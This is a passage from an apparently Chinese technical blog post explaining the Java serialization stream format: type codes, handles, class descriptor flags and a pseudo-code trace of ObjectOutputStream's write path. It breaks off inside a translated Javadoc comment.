      <p>有时候我们也可以通过 HTTP 请求头来确定数据类型是序列化数据，例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-type: application/x-java-serialized-object</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="类型码"><a href="#类型码" class="headerlink" title="类型码"></a>类型码</h3><p>在序列化数据中，一个字段是由类型码开始的。类型码描述当前位置后续数据对应什么类型，Java 反序列化时会根据这个字段决定选择进入什么分支对后续数据进行反序列化。</p>
<table>
<thead>
<tr>
<th>码值</th>
<th>名称</th>
<th>含义（下一步…）</th>
</tr>
</thead>
<tbody><tr>
<td><code>0x70</code></td>
<td><code>TC_NULL</code></td>
<td>空引用</td>
</tr>
<tr>
<td><code>0x71</code></td>
<td><code>TC_REFERENCE</code></td>
<td>句柄回引：后跟 4 字节句柄（wire handle）</td>
</tr>
<tr>
<td><code>0x72</code></td>
<td><code>TC_CLASSDESC</code></td>
<td>普通类的类描述符</td>
</tr>
<tr>
<td><code>0x73</code></td>
<td><code>TC_OBJECT</code></td>
<td>对象本体</td>
</tr>
<tr>
<td><code>0x74</code></td>
<td><code>TC_STRING</code></td>
<td>短字符串</td>
</tr>
<tr>
<td><code>0x7C</code></td>
<td><code>TC_LONGSTRING</code></td>
<td>长字符串</td>
</tr>
<tr>
<td><code>0x75</code></td>
<td><code>TC_ARRAY</code></td>
<td>数组</td>
</tr>
<tr>
<td><code>0x76</code></td>
<td><code>TC_CLASS</code></td>
<td><code>java.lang.Class</code> 对象</td>
</tr>
<tr>
<td><code>0x77</code></td>
<td><code>TC_BLOCKDATA</code></td>
<td>块数据（长度 1 字节）</td>
</tr>
<tr>
<td><code>0x7A</code></td>
<td><code>TC_BLOCKDATALONG</code></td>
<td>块数据（长度 4 字节）</td>
</tr>
<tr>
<td><code>0x78</code></td>
<td><code>TC_ENDBLOCKDATA</code></td>
<td>块数据&#x2F;自定义数据结束</td>
</tr>
<tr>
<td><code>0x79</code></td>
<td><code>TC_RESET</code></td>
<td>句柄表重置</td>
</tr>
<tr>
<td><code>0x7B</code></td>
<td><code>TC_EXCEPTION</code></td>
<td>写端抛出的致命异常对象</td>
</tr>
<tr>
<td><code>0x7D</code></td>
<td><code>TC_PROXYCLASSDESC</code></td>
<td>代理类的类描述符</td>
</tr>
<tr>
<td><code>0x7E</code></td>
<td><code>TC_ENUM</code></td>
<td>枚举常量</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>句柄（handle）</strong>：每个“首次出现”的对象&#x2F;字符串&#x2F;数组&#x2F;类描述符&#x2F;类对象都会被分配一个句柄（线上从 <code>0x7E0000</code> 起递增）。后续重复出现，用 <code>TC_REFERENCE</code> + (base+下标) 回指。</p>
<p>例如：若之后<strong>再次</strong>写入同一个 <code>String</code> 实例 <code>&quot;Bob&quot;</code>（同一对象，不是同值新对象），就会出现：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71 00 7E 00 03   // TC_REFERENCE + 0x7E0003（示意）</span><br></pre></td></tr></table></figure></div>

<p><strong>wire handle 计算</strong>：<code>wire = 0x7E0000 + localIndex</code>；读端用 <code>wire - 0x7E0000</code> 找回本地句柄表的下标。</p>
</blockquote>
<h3 id="对象类型：TC-OBJECT"><a href="#对象类型：TC-OBJECT" class="headerlink" title="对象类型：TC_OBJECT"></a>对象类型：<code>TC_OBJECT</code></h3><p>在众多类型中，对象类型是最重要的，该类型码后续的结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TC_OBJECT</span><br><span class="line">  classDesc                 // 可以是 TC_CLASSDESC / TC_PROXYCLASSDESC / TC_REFERENCE</span><br><span class="line">  classdata                 // 按“父类 → 子类”的层级逐层写</span><br></pre></td></tr></table></figure></div>

<h4 id="类描述符（Class-Descriptor）"><a href="#类描述符（Class-Descriptor）" class="headerlink" title="类描述符（Class Descriptor）"></a>类描述符（Class Descriptor）</h4><h5 id="普通类：TC-CLASSDESC"><a href="#普通类：TC-CLASSDESC" class="headerlink" title="普通类：TC_CLASSDESC"></a>普通类：<code>TC_CLASSDESC</code></h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TC_CLASSDESC</span><br><span class="line">  UTF className</span><br><span class="line">  long serialVersionUID</span><br><span class="line">  byte flags                // 是否 Serializable / Externalizable / ENUM / 有 writeObject / 是否 block-data 等</span><br><span class="line">  short fieldCount</span><br><span class="line">    [ fieldDesc * fieldCount ]</span><br><span class="line">  classAnnotations          // Block-Data（可选，可能为空），以 TC_ENDBLOCKDATA 结尾</span><br><span class="line">  superClassDesc            // 父类的类描述符（递归；到 Object 为 TC_NULL）</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>flags</code> 常量有如下标志位：</p>
<table>
<thead>
<tr>
<th>标志</th>
<th>值</th>
<th>语义</th>
</tr>
</thead>
<tbody><tr>
<td><code>SC_WRITE_METHOD</code></td>
<td><code>0x01</code></td>
<td>定义了 <code>private void writeObject(ObjectOutputStream)</code>（⇒ 该层有“自定义区”，读完需见 <code>TC_ENDBLOCKDATA</code>）</td>
</tr>
<tr>
<td><code>SC_SERIALIZABLE</code></td>
<td><code>0x02</code></td>
<td><code>implements Serializable</code></td>
</tr>
<tr>
<td><code>SC_EXTERNALIZABLE</code></td>
<td><code>0x04</code></td>
<td><code>implements Externalizable</code>（与上一个互斥）</td>
</tr>
<tr>
<td><code>SC_BLOCK_DATA</code></td>
<td><code>0x08</code></td>
<td>Externalizable 在 <strong>v2 协议</strong>下使用块数据包裹</td>
</tr>
<tr>
<td><code>SC_ENUM</code></td>
<td><code>0x10</code></td>
<td>枚举类型（SUID 必须为 0；字段数为 0）</td>
</tr>
</tbody></table>
<p>字段描述 <code>fieldDesc</code> 结构为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">byte typeCode               // &#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;F&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;S&#x27;,&#x27;Z&#x27;,&#x27;L&#x27;,&#x27;[&#x27;</span><br><span class="line">UTF fieldName</span><br><span class="line">[ UTF typeString ]          // 仅当 typeCode 为 &#x27;L&#x27;(对象) 或 &#x27;[&#x27;(数组) 时存在，形如 &quot;Ljava/lang/String;&quot;、&quot;[I&quot;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>是否有 <code>readObject(..)</code> 并不写在描述符里</strong>；写端仅通过 <code>flags</code> 标出“有 <code>writeObject(..)</code>”（意味着该层会出现自定义 block-data）。读端会反射检测 <code>readObject(..)</code> 并调用。</p>

    </div>
  </div>

<h5 id="代理类：TC-PROXYCLASSDESC"><a href="#代理类：TC-PROXYCLASSDESC" class="headerlink" title="代理类：TC_PROXYCLASSDESC"></a>代理类：<code>TC_PROXYCLASSDESC</code></h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TC_PROXYCLASSDESC</span><br><span class="line">  int interfaceCount</span><br><span class="line">  UTF interfaceName[interfaceCount]</span><br><span class="line">  classAnnotations          // Block-Data（可选），以 TC_ENDBLOCKDATA 结尾</span><br><span class="line">  superClassDesc</span><br></pre></td></tr></table></figure></div>

<p>读端会通过 <code>resolveProxyClass(String[])</code>：按规则选 ClassLoader，<code>Class.forName</code> 加载接口，检查<strong>非 public 接口的类加载器必须一致</strong>，最终 <code>Proxy.getProxyClass(loader, ifaces)</code> 生成代理类。</p>
<h5 id="classdata（对象实例数据）"><a href="#classdata（对象实例数据）" class="headerlink" title="classdata（对象实例数据）"></a><code>classdata</code>（对象实例数据）</h5><p><strong>classdata 的每一层（某个可序列化类）有两种路径</strong>：</p>
<ul>
<li><strong>Externalizable</strong>（<code>flags</code> 指示）：<ul>
<li>v2 协议下以 Block-Data 包裹对象的 <code>writeExternal</code> 输出，末尾写 <code>TC_ENDBLOCKDATA</code>；</li>
<li>读端调用 <code>readExternal</code>，读完后用 <code>skipCustomData()</code> 吞掉剩余块直至 <code>TC_ENDBLOCKDATA</code>。</li>
</ul>
</li>
<li><strong>Serializable</strong>：<ul>
<li>**有 <code>writeObject(..)</code>**：写端进入 Block-Data，由自定义方法写“自定义区”（里面可以调用 <code>defaultWriteObject()</code> 写默认字段，也可以再写对象&#x2F;块）；结束后写 <code>TC_ENDBLOCKDATA</code>。读端进入块模式调用 <code>readObject(..)</code>，完了后用 <code>TC_ENDBLOCKDATA</code> 收尾（<code>skipCustomData()</code> 兜底）。</li>
<li><strong>无 <code>writeObject(..)</code><strong>：</strong>默认字段</strong>序列化（不包 <code>TC_ENDBLOCKDATA</code>）<ul>
<li>先按顺序写<strong>所有原始类型字段</strong>的字节；</li>
<li>再写<strong>所有对象&#x2F;数组字段</strong>，每个字段的值本身是一个“值记录”：<code>TC_NULL</code> &#x2F; <code>TC_REFERENCE</code> &#x2F; <code>TC_OBJECT</code> &#x2F; <code>TC_STRING</code> &#x2F; <code>TC_ARRAY</code> &#x2F; …</li>
<li>因为字段个数在类描述符里已知，所以不需要额外结束标记。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="序列化过程分析"><a href="#序列化过程分析" class="headerlink" title="序列化过程分析"></a>序列化过程分析</h2><p>通常我们通过下面这个过程将对象序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(object);</span><br></pre></td></tr></table></figure></div>

<p>序列化过程如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/1945946143.jpg"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out)</span><br><span class="line">  ├─ verifySubclass()</span><br><span class="line">  ├─ bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out)</span><br><span class="line">  ├─ handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(...), subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(...)</span><br><span class="line">  ├─ enableOverride = <span class="literal">false</span></span><br><span class="line">  ├─ writeStreamHeader() → STREAM_MAGIC, STREAM_VERSION</span><br><span class="line">  └─ bout.setBlockDataMode(<span class="literal">true</span>)                <span class="comment">// 进入“块数据模式”（后续会在需要时临时切换）</span></span><br><span class="line"></span><br><span class="line">writeObject(obj)</span><br><span class="line">  ├─ <span class="keyword">if</span> (enableOverride) → writeObjectOverride(obj) → <span class="keyword">return</span></span><br><span class="line">  └─ <span class="keyword">try</span> → writeObject0(obj, <span class="comment">/*unshared=*/</span><span class="literal">false</span>)</span><br><span class="line">       └─ <span class="keyword">catch</span>(IOException ex)</span><br><span class="line">            ├─ <span class="keyword">if</span> (depth==<span class="number">0</span>) → writeFatalException(ex)  <span class="comment">// 最外层写致命异常块</span></span><br><span class="line">            └─ rethrow</span><br><span class="line"></span><br><span class="line"><span class="title function_">writeObject0</span><span class="params">(obj, unshared)</span></span><br><span class="line">  ├─ old = bout.setBlockDataMode(<span class="literal">false</span>)         <span class="comment">// 切到“非块模式”写结构化标记</span></span><br><span class="line">  ├─ depth++</span><br><span class="line">  ├─ obj = subs.lookup(obj)                     <span class="comment">// 替换表命中则直接替换</span></span><br><span class="line">  ├─ 快速分支：</span><br><span class="line">  │   ├─ obj == <span class="literal">null</span>            → writeByte(TC_NULL) → <span class="keyword">finally</span></span><br><span class="line">  │   ├─ !unshared &amp;&amp; handles.lookup(obj) != -<span class="number">1</span></span><br><span class="line">  │   │    └─ writeByte(TC_REFERENCE) + writeInt(<span class="number">0x7E0000</span> + handle) → <span class="keyword">finally</span></span><br><span class="line">  │   ├─ obj <span class="keyword">instanceof</span> Class   → writeClass((Class)obj, unshared) → <span class="keyword">finally</span></span><br><span class="line">  │   └─ obj <span class="keyword">instanceof</span> ObjectStreamClass → writeClassDesc((OSC)obj, unshared) → <span class="keyword">finally</span></span><br><span class="line">  ├─ 替换链：</span><br><span class="line">  │   ├─ orig = obj</span><br><span class="line">  │   ├─ <span class="keyword">while</span> (desc.hasWriteReplace()) obj = desc.invokeWriteReplace(obj)</span><br><span class="line">  │   ├─ <span class="keyword">if</span> (enableReplace) obj = replaceObject(obj)</span><br><span class="line">  │   └─ <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">  │         subs.assign(orig, obj)              <span class="comment">// 记录 A→B 稳定替换</span></span><br><span class="line">  │         <span class="comment">// 再跑一遍“快速分支”（null / reference / Class / OSC）</span></span><br><span class="line">  │       &#125;</span><br><span class="line">  ├─ 类型分派：</span><br><span class="line">  │   ├─ String      → writeString(str, unshared)  <span class="comment">// TC_STRING/TC_LONGSTRING + UTF</span></span><br><span class="line">  │   ├─ Array       → writeArray(arr, desc, unshared)</span><br><span class="line">  │   ├─ Enum        → writeEnum(e, desc, unshared) <span class="comment">// TC_ENUM + 类型描述 + 常量名</span></span><br><span class="line">  │   └─ Serializable→ writeOrdinaryObject(obj, desc, unshared)</span><br><span class="line">  └─ <span class="keyword">finally</span></span><br><span class="line">      ├─ depth--</span><br><span class="line">      └─ bout.setBlockDataMode(old)             <span class="comment">// 恢复进入前的模式</span></span><br><span class="line"></span><br><span class="line">writeOrdinaryObject(obj, desc, unshared)</span><br><span class="line">  ├─ desc.checkSerialize()</span><br><span class="line">  ├─ writeByte(TC_OBJECT)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="comment">/*unshared=*/</span><span class="literal">false</span>)</span><br><span class="line">  │   ├─ <span class="keyword">if</span> (desc == <span class="literal">null</span>)      → writeByte(TC_NULL)</span><br><span class="line">  │   ├─ <span class="keyword">else</span> <span class="keyword">if</span> (handles.lookup(desc) != -<span class="number">1</span> &amp;&amp; 允许共享)</span><br><span class="line">  │   │     └─ writeByte(TC_REFERENCE) + writeInt(<span class="number">0x7E0000</span> + handle)</span><br><span class="line">  │   ├─ <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy())</span><br><span class="line">  │   │     └─ writeProxyDesc(desc, unshared)</span><br><span class="line">  │   │         ├─ writeByte(TC_PROXYCLASSDESC)</span><br><span class="line">  │   │         ├─ handles.assign(unshared ? <span class="literal">null</span> : desc)</span><br><span class="line">  │   │         ├─ writeInt(接口数) + 逐个 writeUTF(接口名)</span><br><span class="line">  │   │         ├─ bout.setBlockDataMode(<span class="literal">true</span>) → annotateProxyClass(...) → setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">  │   │         ├─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">  │   │         └─ writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>)</span><br><span class="line">  │   └─ <span class="keyword">else</span></span><br><span class="line">  │         └─ writeNonProxyDesc(desc, unshared)</span><br><span class="line">  │             ├─ writeByte(TC_CLASSDESC)</span><br><span class="line">  │             ├─ handles.assign(unshared ? <span class="literal">null</span> : desc)</span><br><span class="line">  │             ├─ <span class="keyword">if</span> (protocol==V1) desc.writeNonProxy(<span class="built_in">this</span>) <span class="keyword">else</span> writeClassDescriptor(desc)</span><br><span class="line">  │             ├─ bout.setBlockDataMode(<span class="literal">true</span>) → annotateClass(...) → setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">  │             ├─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">  │             └─ writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : obj)       <span class="comment">// 为实例分配句柄；unshared=占位但不登记</span></span><br><span class="line">  └─ <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy())</span><br><span class="line">       └─ writeExternalData((Externalizable)obj)</span><br><span class="line">           ├─ 保存并清空 [curPut, curContext]  <span class="comment">// 禁止 defaultWriteObject/putFields 误用</span></span><br><span class="line">           ├─ <span class="keyword">if</span> (protocol==V1) obj.writeExternal(<span class="built_in">this</span>)</span><br><span class="line">           ├─ <span class="keyword">else</span></span><br><span class="line">           │    ├─ bout.setBlockDataMode(<span class="literal">true</span>) → obj.writeExternal(<span class="built_in">this</span>)</span><br><span class="line">           │    ├─ bout.setBlockDataMode(<span class="literal">false</span>)</span><br><span class="line">           │    └─ writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">           └─ 恢复 [curPut, curContext]</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       └─ writeSerialData(obj, desc)             <span class="comment">// 父 → 子</span></span><br><span class="line">           └─ <span class="keyword">for</span> (slotDesc : desc.getClassDataLayout())</span><br><span class="line">               ├─ <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod())</span><br><span class="line">               │    ├─ 保存并清空 [curPut], 切换 curContext=<span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(...)</span><br><span class="line">               │    ├─ bout.setBlockDataMode(<span class="literal">true</span>)  → slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>)</span><br><span class="line">               │    ├─ bout.setBlockDataMode(<span class="literal">false</span>) → writeByte(TC_ENDBLOCKDATA)</span><br><span class="line">               │    └─ 恢复 [curPut, curContext]</span><br><span class="line">               └─ <span class="keyword">else</span></span><br><span class="line">                    └─ defaultWriteFields(obj, slotDesc)</span><br><span class="line">                        ├─ slotDesc.checkDefaultSerialize()</span><br><span class="line">                        ├─ primSize = slotDesc.getPrimDataSize()</span><br><span class="line">                        ├─ primVals = pack primitive 字段字节</span><br><span class="line">                        ├─ bout.write(primVals, <span class="number">0</span>, primSize, <span class="literal">false</span>)   <span class="comment">// 纯字节，不写 ENDBLOCK</span></span><br><span class="line">                        └─ 写对象/数组字段：</span><br><span class="line">                           └─ objVals = slotDesc.getObjFieldValues(obj)</span><br><span class="line">                              └─ <span class="keyword">for</span> (i=<span class="number">0.</span>.)</span><br><span class="line">                                  └─ writeObject0(objVals[i], slotDesc.getFields(<span class="literal">false</span>)[base+i].isUnshared())</span><br><span class="line"></span><br><span class="line">writeString(str, unshared)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : str)</span><br><span class="line">  ├─ utflen = bout.getUTFLength(str)</span><br><span class="line">  ├─ <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>)</span><br><span class="line">  │    └─ writeByte(TC_STRING)     → bout.writeUTF(str, utflen)</span><br><span class="line">  └─ <span class="keyword">else</span></span><br><span class="line">       └─ writeByte(TC_LONGSTRING) → bout.writeLongUTF(str, utflen)</span><br><span class="line"></span><br><span class="line">writeArray(arr, desc, unshared)</span><br><span class="line">  ├─ writeByte(TC_ARRAY)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="literal">false</span>)</span><br><span class="line">  ├─ handles.assign(unshared ? <span class="literal">null</span> : arr)</span><br><span class="line">  ├─ writeInt(length)</span><br><span class="line">  ├─ <span class="keyword">if</span> (原始类型数组)  → 连续写元素原始字节（必要时临时 blk=ON 以聚合）</span><br><span class="line">  └─ <span class="keyword">else</span>（对象数组） → <span class="keyword">for</span> (elem : arr) writeObject0(elem, <span class="comment">/*字段级unshared?*/</span><span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">writeEnum(e, desc, unshared)</span><br><span class="line">  ├─ writeByte(TC_ENUM)</span><br><span class="line">  ├─ writeClassDesc(desc, <span class="literal">false</span>)</span><br><span class="line">  └─ writeString(e.name(), <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></div>



<h3 id="ObjectOutputStream-对象"><a href="#ObjectOutputStream-对象" class="headerlink" title="ObjectOutputStream 对象"></a>ObjectOutputStream 对象</h3><p>其中负责序列化的 <code>ObjectOutputStream</code> 是一个实现了 <code>ObjectOutput</code> 接口的 <code>OutputStream</code> 的子类，定义如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectOutputStream 能把 Java 的原始数据类型以及**对象图**写入到一个 OutputStream 中；</span></span><br><span class="line"><span class="comment"> * 之后可由 ObjectInputStream 读取并“复原（reconstitute）”这些对象。</span></span><br><span class="line"><span class="comment"> * 若底层是文件流即可实现**持久化存储**；若底层是网络 Socket 流，则对象可在**另一进程/主机**上被复原。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;只有实现了 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 接口的对象才能被写入该流。</span></span><br><span class="line"><span class="comment"> * 对每个可序列化对象，序列化数据会包含：类名与类签名、对象字段与数组的值，以及</span></span><br><span class="line"><span class="comment"> * 由初始对象**可达的所有对象**（对象闭包，形成完整对象图）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;使用 &#123;<span class="doctag">@link</span> #writeObject(Object)&#125; 将对象写入流。任何对象（包括 String 与数组）</span></span><br><span class="line"><span class="comment"> * 都通过此方法写出；也可以在一个流里连续写出多个对象或原始类型。</span></span><br><span class="line"><span class="comment"> * **读取方必须以相同的类型与顺序**，用对应的 ObjectInputStream 读回这些数据。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;原始数据类型也可通过 &#123;<span class="doctag">@link</span> java.io.DataOutput&#125; 的相应方法写出；</span></span><br><span class="line"><span class="comment"> * 字符串还可以用 &#123;<span class="doctag">@link</span> #writeUTF(String)&#125; 写出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;对象的**默认序列化机制**会写出：对象所属类、类签名，以及所有**非 transient 且非 static**</span></span><br><span class="line"><span class="comment"> * 字段的取值。对其它对象的引用（不含 transient/static 字段中的引用）也会被写出。</span></span><br><span class="line"><span class="comment"> * 对**同一个对象的多次引用**会用**引用共享机制**（句柄）编码，以便在反序列化时恢复出与原始对象图</span></span><br><span class="line"><span class="comment"> * **形状一致**的共享与环状关系。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;示例（与 ObjectInputStream 示例配套）：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *     FileOutputStream fos = new FileOutputStream(&quot;t.tmp&quot;);</span></span><br><span class="line"><span class="comment"> *     ObjectOutputStream oos = new ObjectOutputStream(fos);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     oos.writeInt(12345);</span></span><br><span class="line"><span class="comment"> *     oos.writeObject(&quot;Today&quot;);</span></span><br><span class="line"><span class="comment"> *     oos.writeObject(new Date());</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     oos.close();</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;在序列化/反序列化过程中需要特殊处理的类，必须**精确签名**地实现如下专有方法：</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream stream)</span></span><br><span class="line"><span class="comment"> *     throws IOException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span 